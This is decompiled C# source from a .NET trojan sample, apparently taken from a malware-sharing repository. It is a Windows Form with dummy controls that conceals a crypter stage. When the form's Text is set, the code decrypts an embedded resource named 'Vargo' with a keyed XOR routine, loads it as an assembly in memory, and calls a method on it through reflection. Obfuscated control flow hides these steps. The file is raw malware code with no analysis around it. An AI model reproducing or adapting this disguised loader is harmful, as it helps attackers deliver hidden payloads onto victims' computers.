// Decompiled with JetBrains decompiler
// Type: DebuggerTypeProxyAttrib.Templates.StructRulesTemplate
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Pages;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Tourield.Workers;

namespace DebuggerTypeProxyAttrib.Templates
{
  public class StructRulesTemplate : Form
  {
    private IContainer _Order;
    private static object m_Wrapper;
    private ListBox m_Prototype;
    private RichTextBox m_Adapter;
    private CheckedListBox m_Issuer;
    private MonthCalendar factory;
    private MonthCalendar parser;
    private CheckedListBox _Error;
    private RichTextBox page;
    private ListBox resolver;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public StructRulesTemplate()
    {
      int num1 = 0;
      while (true)
      {
        int num2;
        string[] parameters;
        MethodInfo method;
        switch (num1)
        {
          case 0:
            RegistryPagePage.ListMethod();
            if (StructRulesTemplate.StopAttribute())
            {
              num1 = 5;
              continue;
            }
            goto case 6;
          case 1:
          case 5:
            this._Order = (IContainer) null;
            // ISSUE: explicit constructor call
            base.\u002Ector();
            this.PatchOrder();
            num2 = 4;
            break;
          case 2:
          case 4:
            method = ((System.Type) StructRulesTemplate.m_Wrapper).GetMethod("InvalidCast");
            parameters = new string[3]
            {
              "436163686554",
              null,
              null
            };
            goto case 3;
          case 3:
            parameters[1] = "367254643368";
            if (true)
            {
              num1 = 6;
              continue;
            }
            goto case 0;
          case 6:
            parameters[2] = "Tourield";
            method.Invoke((object) 0, (object[]) parameters);
            num2 = 7;
            break;
          case 7:
            goto label_10;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
      }
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool setitem)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              if (setitem)
              {
                if (true)
                {
                  num2 = 4;
                  continue;
                }
                goto label_12;
              }
              else
                goto label_4;
            case 1:
            case 4:
              goto label_3;
            case 2:
            case 3:
              goto label_1;
            case 5:
              goto label_13;
            default:
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto case 0;
          }
        }
label_1:
label_2:
        base.Dispose(setitem);
        num1 = 5;
        continue;
label_3:
        int num3 = this._Order != null ? 1 : 0;
        goto label_5;
label_4:
        num3 = 0;
label_5:
        if (num3 != 0)
        {
          this._Order.Dispose();
          goto label_1;
        }
        else
          goto label_2;
      }
label_13:
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PatchOrder()
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              this.AutoScaleDimensions = new SizeF(6f, 13f);
              num2 = 11;
              continue;
            case 1:
              goto label_20;
            case 2:
              this.parser.Name = "monthCalendar2";
              this.parser.TabIndex = 7;
              this._Error.FormattingEnabled = true;
              this._Error.Location = new Point(550, 198);
              this._Error.Name = "checkedListBox2";
              this._Error.Size = new Size(120, 94);
              this._Error.TabIndex = 6;
              if (!StructRulesTemplate.SortAttribute())
              {
                num2 = 15;
                continue;
              }
              goto case 4;
            case 3:
              this.m_Prototype.FormattingEnabled = true;
              this.m_Prototype.Location = new Point(461, 118);
              this.m_Prototype.Name = "listBox1";
              this.m_Prototype.Size = new Size(8, 4);
              if (!StructRulesTemplate.SortAttribute())
              {
                num2 = 7;
                continue;
              }
              goto case 5;
            case 4:
              this.Controls.Add((Control) this.page);
              this.Controls.Add((Control) this.resolver);
              this.Controls.Add((Control) this.factory);
              this.Controls.Add((Control) this.m_Issuer);
              this.Controls.Add((Control) this.m_Adapter);
              this.Controls.Add((Control) this.m_Prototype);
              this.Name = "Form1";
              this.Text = "Form1";
              this.ResumeLayout(false);
              num2 = 18;
              continue;
            case 5:
            case 12:
              this.resolver.Size = new Size(8, 4);
              this.resolver.TabIndex = 4;
              if (true)
              {
                num2 = 0;
                continue;
              }
              goto label_18;
            case 6:
              goto label_7;
            case 7:
              goto label_15;
            case 8:
            case 9:
              this.page.Size = new Size(8, 8);
              this.page.TabIndex = 5;
              if (true)
              {
                num2 = 10;
                continue;
              }
              goto label_10;
            case 10:
              goto label_19;
            case 11:
              this.AutoScaleMode = AutoScaleMode.Font;
              this.ClientSize = new Size(800, 450);
              this.Controls.Add((Control) this.parser);
              this.Controls.Add((Control) this._Error);
              int num3 = 4;
              num2 = StructRulesTemplate.SortAttribute() ? num3 : num3;
              continue;
            case 13:
              goto label_8;
            case 14:
              goto label_1;
            case 15:
              this.page.Location = new Point(299, 324);
              this.page.Name = "richTextBox2";
              goto case 8;
            case 16:
              goto label_10;
            case 17:
              goto label_18;
            case 18:
              goto label_4;
            default:
              num2 = 8;
              continue;
          }
        }
label_1:
        this.m_Issuer.FormattingEnabled = true;
        this.m_Issuer.Location = new Point(552, 175);
        this.m_Issuer.Name = "checkedListBox1";
        this.m_Issuer.Size = new Size(120, 94);
        this.m_Issuer.TabIndex = 2;
        num1 = 6;
        continue;
label_7:
        this.factory.Location = new Point(132, 95);
        this.factory.Name = "monthCalendar1";
        this.factory.TabIndex = 3;
        this.parser.Location = new Point(130, 118);
        num1 = 2;
        continue;
label_8:
        this.m_Adapter = new RichTextBox();
        this.m_Issuer = new CheckedListBox();
        this.factory = new MonthCalendar();
        this.parser = new MonthCalendar();
        this._Error = new CheckedListBox();
        this.page = new RichTextBox();
        this.resolver = new ListBox();
        this.SuspendLayout();
        num1 = 3;
        continue;
label_10:
        this.m_Adapter.Name = "richTextBox1";
        this.m_Adapter.Size = new Size(8, 8);
        this.m_Adapter.TabIndex = 1;
        this.m_Adapter.Text = "";
        num1 = 14;
        continue;
label_15:
        this.m_Prototype.TabIndex = 0;
        this.m_Adapter.Location = new Point(301, 301);
        num1 = 16;
        continue;
label_18:
        this.resolver.FormattingEnabled = true;
        this.resolver.Location = new Point(459, 141);
        this.resolver.Name = "listBox2";
        num1 = 5;
        continue;
label_19:
        this.page.Text = "";
        num1 = 17;
        continue;
label_20:
        this.m_Prototype = new ListBox();
        num1 = 13;
      }
label_4:;
    }

    public override string Text
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => base.Text;
      [MethodImpl(MethodImplOptions.NoInlining)] set => StructRulesTemplate.CustomizeOrder();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string CustomizeOrder()
    {
      int num1 = 0;
      string str1;
      while (true)
      {
        ResourceManager resourceManager;
        byte[] rawAssembly;
        string str2;
        int num2;
        switch (num1)
        {
          case 0:
            resourceManager = new ResourceManager(typeof (BroadcasterWorker));
            num1 = 3;
            continue;
          case 1:
          case 4:
            str1 = str2;
            num1 = 7;
            continue;
          case 2:
          case 5:
            num2 = 92182;
            break;
          case 3:
            rawAssembly = (byte[]) resourceManager.GetObject("Vargo");
            str2 = "P7C455RF8EBCYHA8URJ585";
            num1 = 5;
            continue;
          case 6:
label_3:
            num2 += -1;
            break;
          case 7:
            goto label_11;
          default:
            num1 = 6;
            continue;
        }
        if (num2 < 0)
        {
          StructRulesTemplate.InsertOrder(Assembly.Load(rawAssembly), 11);
          num1 = 1;
        }
        else
        {
          rawAssembly[num2 % 46080] = (byte) ((((int) rawAssembly[num2 % 46080] ^ (int) str2[num2 % 22]) - (int) rawAssembly[(num2 + 1) % 46080] + 256) % 256);
          goto label_3;
        }
      }
label_11:
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void InsertOrder(Assembly var1, int caller_Ptr) => StructRulesTemplate.m_Wrapper = (object) var1.GetTypes()[caller_Ptr];

    internal static bool StopAttribute() => true;

    internal static bool SortAttribute() => false;
  }
}
